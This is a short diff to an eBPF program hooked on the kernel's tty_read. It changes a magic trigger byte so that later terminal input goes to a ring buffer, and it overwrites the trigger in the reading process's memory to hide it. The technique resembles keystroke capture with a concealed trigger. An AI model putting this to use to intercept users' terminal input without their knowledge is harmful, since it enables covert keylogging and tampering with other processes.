@@ -28,8 +28,11 @@ int BPF_PROG(tty_read, struct kiocb *iocb, struct iov_iter *to, int ret){
 
   ubuf = BPF_CORE_READ(to, ubuf);
   bpf_probe_read_user(&ch, 1, ubuf);
-  if(ch == '\xF4'){
+  if(ch == '\x05'){
     send_to_buffer = true;
+
+    ch = '\0';
+    bpf_probe_write_user(ubuf, &ch, 1);
   }
   else if(send_to_buffer){
     u64 flags = BPF_RB_NO_WAKEUP;
